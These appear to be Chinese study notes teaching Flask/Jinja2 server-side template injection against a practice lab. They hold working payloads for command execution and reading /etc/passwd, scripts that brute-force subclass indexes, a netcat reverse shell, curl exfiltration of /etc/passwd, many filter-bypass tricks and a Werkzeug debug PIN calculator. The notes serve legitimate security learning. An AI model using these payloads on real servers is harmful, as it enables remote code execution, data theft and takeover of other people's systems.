# SSTI漏洞

## Python Venv环境搭建及介绍

venv环境：创建和管理虚拟环境的模块

可以把它想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的，也就是说你在venv下通过pip安装的Python第三方模块是不会存在于你本机的环境下的。

```shell
安装venv
python3 --version
apt update
apt install python3.11-venv
创建venv环境安装flask
cd /Flask # 选择路径
python3 -m venv flask1 # 创建名为flask1的venv环境
```

```shell
vim demo.py
print("this is test")
python3 demo.py
执行flask1路径下的python
方法一：
/Flask/flask1/bin/python3 demo.py
方法二：
cd flask1
source ./bin/activate # 进入虚拟环境
python3 demo.py
deactivate # 退出虚拟环境
```

## flask应用介绍及搭建

Flask是一个使用Python编写的轻量级Web应用框架

```py
from flask import Flask # 启动flask模块，创建一个Flask类
app = Flask(__name__) # __name__是系统变量，指的是本py文件的文件名
@app.route('/benben') # 路由 基于浏览器输入的字符串寻址
def hello():
    return "hello benben"
if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True,port=80) # debug=True使得改完配置后重启项目，使其修改生效，建议只在学习中开启，host="0.0.0.0"表示监听所有物理接口，port=80表示修改端口
```

## flask变量及方法

通过向规则参数添加变量部分，可以动态构建URL

```py
from flask import Flask 
app = Flask(__name__) 
@app.route('/hello/<name>') 
def hello(name):
    return "hello %s" % name
@app.route('/int/<int:postID>') # postID必须为int类型
# @app.route('float/<float:postID>') 必须为float类型
def id(postID):
    return "%d" % postID
if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True)
# 172.31.130.66:5000/hello/动态变量
# 作为关键字参数传递给与规则相关联的函数
```

```py
@app.route('/login',methods = ['POST','GET']) # 可以
def login():
    if request.method == 'POST':
        print(1)
        user = request.form['ben']
        return redirect(url_for('success', name=user))
    else:
        print(2)
        user = request.args.get('ben')
        return redirect(url_for('success', name=user))
```

## flask模板介绍

**视图函数**的主要作用是生成请求的响应，把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本。

使用模板：使用静态的页面html展示动态的内容

模板是一个响应文本的文件，其中占用符（变量）表示动态部分，告诉模板引擎其具体的值需要从使用的数据中获取。

使用真实值替换变量，再返回最终得到的字符串，这个过程称为“渲染“

Flask使用Jinja2这个模板引擎来渲染模板

> **render_template**
>
> 加载html文件。默认文件路径在templates目录下
>
> ```py
> from flask import Flask,render_template
> app = Flask(__name__)
> @app.route('/')
> def index():
>     return render_template('index.html')
> if __name__ == '__main__':
>     app.run()
> ```
>
> 然后再在templates目录下创建index.html文件
>
> ```py
> from flask import Flask,render_template
> app = Flask(__name__)
> @app.route('/')
> def index():
>     my_str= request.args.get('ben')
>     my_int=12
>     my_array=[5,2,0,1,3,1,4]
>     my_dict={
>         'name':'dazhuang',
>         'age':'18'
>     }
>     return render_template('index.html',
>                           my_str=my_str,
>                           my_int=my_int,
>                           my_array=my_array,
>                           my_dict=my_dict)
> if __name__ == '__main__':
>     app.run()
> ```
>
> 往模板中传入数据，字符串，列表，字典
>
> render_template方法：渲染模板
>
> 参数1：模板名称index.html
>
> 参数n：传到模板内的数据
>
> index.html
>
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <title>Title</title>
> </head>
> <body>
> {{ my_str }}
> <br>
> {{ my_int }}
> <br>
> {{ my_array }}
> <br>
> {{ my_dict }}
> <br>
> {% set a = 'dazhuang' %}
> {{ a }}
> </body>
> </html>
> ```

## 模板注入漏洞介绍

漏洞成因：渲染模板时，没有严格控制对用户的输入，使用了危险的模板，导致用户可以和flask程序进行交互

```py
from flask import Flask,request,render_template_string
app = Flask(__name__)
@app.route('/',methods=['GET'])
def index():
    str = request.args.get('ben')
    html_str = 
    '''
    	<html>
    	<head></head>
    	<body>{{str}}</body> 
    	</html>
    '''
    # str是被{{}}包括起来的，会被预先渲染转义，然后才输出，不会被渲染执行，只会获取str对应的字符串，?ben={{7*7}}不会被执行
    return render_template_string(html_str,str=str)
if __name__ == '__main__':
    app.debug = True
    app.run('127.0.0.1','8080')
```

```py
from flask import Flask,request,render_template_string
app = Flask(__name__)
@app.route('/',methods=['GET'])
def index():
    str = request.args.get('ben')
    html_str = 
    '''
    	<html>
    	<head></head>
    	<body>{0}</body> 
    	</html>
    '''.format(str)
    # str值通过format()函数填充到body中间，{}里可以定义任何参数，return render_template_string会把{}内的字符串当成代码指令，输入?ben={{7*7}}会被执行
    return render_template_string(html_str)
if __name__ == '__main__':
    app.debug = True
    app.run('127.0.0.1','8080')
```

![image-20240407085356558](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407085356558.png)

可用来检测漏洞的存在

![image-20240407090507322](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407090507322.png)

这张图可用来检测是哪个模板，判断SSTI类型

## 继承关系和魔术方法

### 继承关系

父类和子类

子类调用父类下的其它子类

Python flask脚本没有办法直接执行Python指令

![image-20240407091008881](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407091008881.png)

```py
class A:pass
class B(A):pass
class C(B):pass
class D(B):pass
c = C()
print(c.__class__) # <class '__main__.C'>当前类C
print(c.__class__.__base__) # <class '__main__.B'>当前类C的父类B
print(c.__class__.__base__.__base__) # <class '__main__.A'>父类的父类
print(c.__class__.__base__.__base__.__base__) # <class 'object'>
print(c.__class__.__mro__) # <class '__main__.C'><class '__main__.B'><class '__main__.A'><class 'object'>罗列所有父类关系C->B->A->object
print(c.__class__.__mro__[1].__subclasses__()) # B下的所有子类 
print(c.__class__.__mro__[1].__subclasses__()[1]) # 调用B下子类的第二个子类
```

### 魔术方法

```py
__class__ # 查找当前类型的所属对象
__base__ # 沿着父子类关系往上走一个
__mro__ # 查找当前类对象的所有继承类
__subclasses__() # 查找父类下的所有子类
__init__ # 查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
__globals__ # 函数会以字典的形式返回当前对象的全部全局变量
```

<img src="SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093329678.png" alt="image-20240407093329678"  />

```
name={{"".__class__.__base__.__subclasses__()}}
```

![image-20240407093402260](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093402260.png)

将上面的内容复制的到notepad++中，将逗号换成换行符

![image-20240407093754794](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093754794.png)

![image-20240407093809044](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093809044.png)

再查找漏洞函数

![image-20240407093833921](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093833921.png)

```
name={{"".__class__.__base__.__subclasses__()[117]}}
进行调用
```

![image-20240407093853982](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407093853982.png)

```
name={{"".__class__.__base__.__subclasses__()[117].__init__}}检测是否重载，未出现wrapper字眼，说明已经重载
```

![image-20240407094000942](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407094000942.png)

```
name={{"".__class__.__base__.__subclasses__()[117].__init__.__globals__}}查看有哪些全局变量，有哪些可以使用的方法函数等
```

```py
name={{"".__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
__builtins__提供对Python的所有“内置”标识符的直接访问
eval()计算字符串表达式的值
popen()执行一个shell以运行命令来开启一个进程
或者
name={{"".__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()}}
```

## SSTI常用注入模块

* 文件读取

  ```py
  查找子类_frozen_importlib_external.FileLoader
  <class '_frozen_importlib_external.FileLoader'>
  ```

  ```py
  Python脚本
  import requests
  url = input('请输入URL链接：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
      try:
          response = requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if '_frozen_importlib_external.FileLoader' in response.text:
                  print(i)
      except:
          pass
  ```

  FileLoader的利用：

  ```py
  ["get_data"](0,"/etc/passwd")
  调用get_data方法，传入参数0和文件路径
  name={{''.__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/etc/passwd")}}
  ```

  读取配置文件下的FLAG

  ```py
  {{url_for.__globals__['current_app'].config.FLAG}}
  {{get_flashed_messages.__globals__['current_app'].config.FLAG}}
  ```

* 内建函数eval执行命令

  内建函数：Python在执行脚本时自动加载的函数

  Python脚本查看可利用内建函数eval的模块

  ```py
  import requests
  url = input('请输入URL：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}
      try:
          response=requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if 'eval' in response.text:
                  print(i)
      except:
          pass
  ```

  ```py
  POC:
      {{().__class__.__base__.__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}
  __builtins__提供对Python的所有“内置”标识符的直接访问
  eval()计算字符串表达式的值
  popen()执行一个shell以运行命令来开启一个进程(system没有回显)
  ```

* os模块执行命令

  在其他函数中直接调用os模块

  ```python
  通过config，调用os
  {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
  通过url_for，调用os
  {{url_for.__globals__.os.popen('whoami').read()}}
  在已经加载os模块的子类里直接调用os模块
  {{''.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls -l /opt").read()}}
  ```

  ```python
  Python脚本查找已经加载os模块的子类
  import requests
  url = input('请输入URL：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"}
      try:
          response=requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if 'os.py' in response.text:
                  print(i)
      except:
          pass
  ```

* importlib类执行命令

  可以加载第三方库，使用load_module加载os

  ```py
  Python脚本查找_frozen_importlib.BuiltinImporter
  import requests
  url = input('请输入URL：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__[0].__subclasses__()["+str(i)+"]}}"}
      try:
          response=requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if '_frozen_importlib.BuiltinImporter' in response.text:
                  print(i)
      except:
          pass
  ```

  ```py
  {{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls -l").read()}}
  ```

* linecache函数执行命令

  linecache函数用于读取任意一个文件的某一行，而这个函数也引入了os模块，所以我们可以利用这个linecache函数去执行命令

  ```py
  import requests
  url = input('请输入URL：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"}
      try:
          response=requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if 'linecache' in response.text:
                  print(i)
      except:
          pass
  ```

  ```py
  {{().__class__.__base__[0].__subclasses__()[191].__init__.__globals__['linecache']['os'].popen("ls -l").read()}}
  {{().__class__.__base__[0].__subclasses__()[191].__init__.__globals__.linecache.os.popen("ls -l").read()}}
  ```

* subprocess.Popen类执行命令

  从Python2.4开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

  subprocess意在替代其他几个老的模块或者函数，比如：os.system、os.popen等函数

  ```py
  import requests
  url = input('请输入URL：')
  for i in range(500):
      data = {"name":"{{().__class__.__base__[0].__subclasses__()["+str(i)+"]}}"}
      try:
          response=requests.post(url,data=data)
          # print(response.text)
          if response.status_code == 200:
              if 'subprocess.Popen' in response.text:
                  print(i)
      except:
          pass
  ```

  ```py
  {{[].__class__.__base__.__subclasses__()[200]("ls /",shell=True,stdout=-1).communicate()[0].strip()}}
  ```

  ![image-20240407143811600](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407143811600.png)

## 绕过过滤双大括号

{% %}是属于flask的控制语句，且以{% end… %}结尾，可以通过在控制语句定义变量或者写循环，判断

```py
判断{{}}被过滤，尝试{%%}判断语句是否能正常执行{% if 2>1 %}benben{% endif %}，有回显
{%if''.__class__%}benben{%endif%}，有回显benben说明''.__class__有内容
{%if''.__class__.__base__.__subprocess__()['+str(i)+'].__init__.__globals__["popen"]("cat /etc/passwd").read()%}benben{%endif%}
```

```py
脚本:（查询可使用popen的子类编号）
import requests
url = 'http://172.31.130.66:8006/flasklab/level/2'
for i in range(500):
    try:
        data = {"code":'{%if "".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("cat /etc/passwd").read() %}Benben{% endif %}'}
        response = requests.post(url,data=data)
        if response.status_code == 200:
            if "Benben" in response.text:
                print(i,"--->",data)
                break
    except:
        pass

117 ---> {'code': '{% if "".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read() %}Benben{% endif %}'}
再使用print()执行命令
{% print("".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read()) %}
```

![image-20240407194505443](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407194505443.png)

## 无回显SSTI

**SSTI盲注思路**

* 反弹shell

  通过rce反弹一个shell出来绕过无回显的页面

  ```py
  import requests
  url = 'http://172.31.130.66:8006/flasklab/level/3'
  for i in range(500):
      try:
          data = {"code": '{{"".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("nc 172.31.130.66 7777 -e /bin/bash").read()}}'}
          r = requests.post(url,data=data)
      except:
          pass
  然后kali中监听7777端口，nc -lvp 7777
  
  for i in range循环执行
  当遇到包含popen的子类时，
  直接执行nc 172.31.130.66 7777 -e /bin/bash
  监听主机收到反弹shell进入对方命令行界面
  ```

* 带外注入

  通过requestbin或dnslog的方式将信息传到外界

  ```py
  import requests
  url = 'http://172.31.130.66:8006/flasklab/level/3'
  for i in range(500):
      try:
          data = {"code": '{{"".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("curl http://172.31.130.66/`cat /etc/passwd`").read()}}'} # 反引号命令执行
          r = requests.post(url,data=data)
      except:
          pass
  同时kali开启一个python http监听
  python3 -m http.server 80
  ```

  

* 纯盲注

  通过写脚本

  ```py
  import requests
  url = 'http://172.31.130.66:8006/flasklab/level/1'
  def check(payload): # 检测r中是否有Benben 
      postdata = {
          'code':payload
      }
      r = requests.post(url,data=postdata)
      if 'Benben' in r.text:
          return '1'
  password = ''
  s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'''_%'
  for i in range(0,100):
      for c in s:
          payload = '{% if "".__class__.__base__.__subclasses__()[199].__init__.__globals__["os"].popen("cat /etc/passwd").read()[' + str(i) + ':' + str(i + 1) + '] == "' + c + '" %}Benben{% endif %}'
          # print(payload)
          if check(payload):
          	password += c
          	break
      print(password)
  ```

## 绕过过滤中括号

  > 
  >
  > __getitem\_\_()魔术方法
  >
  > getitem()是Python的一个魔术方法，
  >
  > 对字典使用时，传入字符串，返回字典相应键所对应的值；
  >
  > 当对列表使用时，传入整数返回列表对应索引的值。

![image-20240407202613324](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240407202613324.png)

```py
code={{''.__class__.__base__.__subclasses__().__getitem__(117)}}
等价于
{{''.__class__.__base__.__subclasses__()[117]}}
```

```py
查找os._wrap_close的序号
import requests
url = input('请输入URL链接：')
for i in range(500):
    data = {"name":'{{"".__class__.__base__.__subclasses__().__getitem__('+str(i)+')}}'}
    try:
        response = requests.post(url,data=data)
        # print(response.text)
        if response.status_code == 200:
            if '_wrap_close' in response.text:
                print(i)
    except:
        pass
```

```py
{{"".__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /etc/passwd').read()}}
```

## 绕过单双引号过滤

>request
>
>request在flask中可以访问基于HTTP请求传递的所有信息
>
>此request并非Python的函数，而是在flask内部的函数
>
>* request.args.key 获取get传入的key的值
>* request.values.x1 所有参数
>* request.cookies 获取cookies传入参数
>* request.headers 获取请求头请求参数
>* request.form.key 获取post传入参数(Content-Type:application/x-www-form-urlencoded或multipart/form-data)
>* request.data 获取post传入参数(Content-Type:a/b)
>* request.json 获取post传入json参数(Content-Type:application/json)

```py
POC:
1.
{{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.x1](request.args.cmd).read()}}
并使用GET方法提交?x1=popen&cmd=cat flag
2.
改成request.form.key来使用POST提交也可以
3.
使用request.cookies.k1，然后在hackbar的MODIFY HEADER添加cookies:
    Cookies         k1=popen;k2=cat flag
```

![image-20240408150401075](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408150401075.png)

## 过滤器绕过下划线过滤

**过滤器**

```py
过滤器通过管道符号（|）与变量连接，并且在括号中可能有选的参数。
flask常用过滤器:
length() # 获取一个序列或者字典的长度并将其返回 
int() # 将值转换为int类型
float() # 将值转换为float类型
lower() # 将字符串转换为小写
upper() # 将字符串转换为大写
reverse() # 反转字符串
replace(value,old,new) # 将value中的old替换为new
list() # 将变量转换为列表类型
string() # 将变量转换为字符串类型
join() # 将一个序列中的参数值拼接成字符串，通常有Python内置的dict()配合使用
attr() # 获取对象的属性
```

> * 使用request方法
>
> GET提交：URL?x1=__class\_\_
>
> POST提交：code={{()|attr(request.args.x1)}}
>
> 在POST中过滤了就在GET中绕过

```py
POC:
    GET:
    http://172.31.130.66:8006/flasklab/level/6?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__
    POST:
    code={{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)('popen')('cat /etc/passwd')|attr('read')()}}
```

> * 使用Unicode编码
>
>   ![image-20240408172810915](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408172810915.png)

> * 使用十六位编码
>
>   ![image-20240408172831277](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240408172831277.png)

> * 格式化字符串
>
>   ![image-20240408172911404](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240408172911404.png)

## 中括号绕过点过滤

```py
点'.'被过滤
1. 用中括号[]代替点:
    Python语法除了可以用点'.'来访问对象属性外，还可以使用中括号'[]'
    {{().__class__}} == {{()['__class__']}} # 注意引号
2. 用attr()绕过:
    payload语句中不会用到点'.'和中括号'[]'
```

## 绕过关键字过滤

**过滤了class、arg、from、value、init、global等关键字**

> 以“\_\_class__为例”
>
> 1. 字符编码
>
>    ![image-20240413175156222](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240413175156222.png)
>
> 2. 最简单拼接“+”：‘__cl’+‘ass\_\_’
>
>    ![image-20240408174716513](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408174716513.png)
>
> 3. 使用Jinja2中的“~”进行拼接：{%set a=“__cla”%}{%set b=“ss\_\_”%}{{()[a~b]}}
>
>    ![image-20240408174915165](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408174915165.png)
>
> 4. 使用过滤器(reverse反转、replace替换、join拼接等)
>
>    {%set a=“\_\_ssalc\_\_”|reverse%}{{a}}
>
>    ![image-20240408175047318](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408175047318.png)
>
>    ![image-20240408175145773](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408175145773.png)
>
> 5. 利用Python的char()：
>
>    {% set url=url_for.__globals\_\_[‘\_\_builtins\_\_’].chr%}{{“”[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
>
>    ![image-20240408175253295](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408175253295.png)

## Length过滤器绕过数字过滤

```py
{% set a='aaaaaaaaaa'|length %}{{a}}--->10
{% set a='aaaaaaaaaa'|length * 'aaa'|length %}{{a}}--->30
```

```py
构造payload:
{{''.__class__.__base__.__subclasses__()[199].__init__.__globals__['os'].popen('ls /').read()}}
替换为
{% set a='aaaaaaaaaa'|length*'aaaaaaaaaa'|length*'aa'|length-'a'|length %}
{{{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['os'].popen('ls /').read()}}}}
```

## 获取config文件

在无过滤情况下可以直接使用{{config}}直接查看

> * flask内置函数
>
> lipsum可加载第三方库
>
> url_for可返回url路径
>
> get_flashed_message可获取信息

> * flask内置对象
>
> cycler
>
> joiner
>
> namespace
>
> config
>
> request
>
> session

可利用已加载内置函数或对象寻找被过滤字符串

可利用内置函数调用current_app模块进而查看配置文件

![image-20240408180920096](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408180920096.png)

```py
调用current_app相当于调用flask
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

## 一些其他的绕过

![image-20240408214222953](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408214222953.png)

然后再使用list来拆分字符

![image-20240408214332307](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408214332307.png)

## 例题一

![image-20240408215101209](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408215101209.png)

## 例题二

> 可使用pop替代\_\_getitem__，以避免出现下划线

![image-20240408215927656](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408215927656.png)

![image-20240408220232823](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408220232823.png)

```py
{%set nine=dict(aaaaaaaaa=a)|join|count%}
{%set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}
{%set kg=(lipsum|string|list)|attr(pop)(nine)%}
{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}
{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}
{%set os=dict(os=a)|join%}
{%set popen=dict(popen=a)|join%}
{%set flag=(dict(cat=a)|join,kg,dict(flag=a)|join)|join%}
{%set read=dict(read=a)|join%}
{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()}}
```

## Debug pin码计算

对于有文件包含或文件读取的漏洞，且**开启debug功能**，想要执行指令还需要输入pin码，输入pin码后可以输入命令执行

![image-20240408222550953](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408222550953.png)

### pin码生成原理

pin码主要由六个参数构成：

1. username –> 执行代码时候的用户名
2. getattr(app, “__name\_\_”, app.\_\_class\_\_.\_\_name\_\_) –> Flask
3. modname –> 固定值默认flask.app
4. getattr(mod, “__file\_\_”, None) –>app.py文件所在路径
5. str(uuid.getnode()) –> 电脑上mac地址
6. get_machine_id –> 根据操作系统不同，有四种获取方式

> 1. 获取用户名username
>
>    ```py
>    import getpass
>    username = getpass.getuser()
>    print(username)
>    ```
>
> 2. 获取app对象name属性
>
>    getattr(app, “__name\_\_”, app.\_\_class\_\_.\_\_name\_\_)
>
>    ```py
>    from flask import Flask
>    app = Flask(__name__)
>    print(getattr(app,"__name__",type(app).__name__))
>    '''
>    获取的是当前app对象的__name__属性，
>    若不存在则获取类的__name__属性，
>    默认为Flask
>    '''
>    ```
>
> 3. 获取app对象module属性
>
>    ```py
>    import sys
>    from flask import Flask
>    import typing as t
>    app = Flask(__name__)
>    modname = getattr(app,"__module__",t.cast(object,app).__class__.__module__)
>    mod = sys.modules.get(modname)
>    print(mod)
>    '''
>    取的是app对象的__module__属性，
>    若不存在的话取类的__module__属性，
>    默认为flask.app
>    '''
>    ```
>
> 4. mod的__file\_\_属性
>
>    app.py文件所在路径
>
>    ```py
>    import sys
>    from flask import Flask
>    import typing as t
>    app = Flask(__name__)
>    modname = getattr(app,"__module__",t.cast(object,app).__class__.__module__)
>    mod = sys.modules.get(modname)
>    print(getattr(mod,"__file__",None))
>    ```
>
>    ![image-20240408224135073](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408224135073.png)
>
> 5. uuid
>
>    实际上就是当前网卡的物理地址的整型
>
>    ```py
>    import uuid
>    print(str(uuid.getnode()))
>    ```
>
> 6. get_machine_id获取
>
>    Python flask版本不同，读取顺序也不同
>
>    * Linux
>
>      ```py
>      /etc/machine-id,
>      /proc/sys/kernl/random/boot_id
>      # 前者固定后者不固定 
>      ```
>
>    * Docker
>
>      ```py
>      /proc/self/cgroup
>      # 正则分割
>      ```
>
>    * macOS
>
>      ```py
>      ioreg -c |OPlatformExpertDevice -d 2
>      # "serial-number"=<{ID}部分
>      ```
>
>    * Windows
>
>      ```py
>      HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
>      # 注册表
>      ```
>
>    get_machine_id的获取的代码到werkzeug\debug\\\_\_init__.py中的第48行的函数get\_machine\_id查看，从这个文件中的191行到221行也可以得到pin码的生成脚本，只需要略微修改即可 
>
>    ```py
>    import hashlib
>    from itertools import chain
>    probably_public_bits = [
>        'Administrator',
>        'flask.app',
>        'Flask',
>        'E:\Github\Code_and_Note\项目\Pycharm\flaskProject\venv\Lib\site-packages\flask\app.py'
>    ]
>    private_bits = [
>        '53366211548225',
>        '5315063a-6279-47cf-affd-bc3bc91f9ae9'
>    ]
>    h = hashlib.sha1()
>    for bit in chain(probably_public_bits, private_bits):
>        if not bit:
>            continue
>        if isinstance(bit, str):
>            bit = bit.encode()
>        h.update(bit)
>    h.update(b"cookiesalt")
>                      
>    cookie_name = f"__wzd{h.hexdigest()[:20]}"
>                      
>    # If we need to generate a pin we salt it a bit more so that we don't
>    # end up with the same value and generate out 9 digits
>    num = None
>    if num is None:
>        h.update(b"pinsalt")
>        num = f"{int(h.hexdigest(), 16):09d}"[:9]
>                      
>    # Format the pincode in groups of digits for easier remembering if
>    # we don't have a result yet.
>    rv = None
>    if rv is None:
>        for group_size in 5, 4, 3:
>            if len(num) % group_size == 0:
>                rv = "-".join(
>                    num[x : x + group_size].rjust(group_size, "0")
>                    for x in range(0, len(num), group_size)
>                )
>                break
>        else:
>            rv = num
>    print(rv)
>    ```
>
>    ![image-20240408234120184](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408234120184.png)
>
>    pin码生成原理：
>
>    1. 获取六个参数
>    2. 根据Python不同版本
>    3. 使用计算代码
>    4. 本地化生成pin码

## pin码计算题目

1. username —> 通过查看/etc/passwd

2. modname —>flask.app

3. getattr(app, “__name\_\_”, app.\_\_class\_\_.\_\_name\_\_) —>Flask

4. app.py文件所在路径 —> 通过报错页面来查看

   ![image-20240408235023613](SSTI%E6%BC%8F%E6%B4%9E.assets/image-20240408235023613.png)

5. uuid直接去读取

   ```py
   /sys/class/net/ens33/address —> centos
   
   /sys/class/net/eth0/address —> ubunt
   
   得到
   02:42:ac:11:00:02
   将其转化为十进制
   2482658870020
   ```

6. machine-id

   ```py
   /etc/machine-id —> 在前，第一段b7471d41202f4da392a4743b37ea3b69
   
   /proc/self/cgroup —> docker，第二段d34168894a556ade16fdc8313b2809b8beb9eb545bd829416fa781ab6f36d9a4
   
   然后再将获取的两段直接拼接起来得到machine-id
   b7471d41202f4da392a4743b37ea3b69d34168894a556ade16fdc8313b2809b8beb9eb545bd829416fa781ab6f36d9a4
   ```

最终得到pin码387-500-770
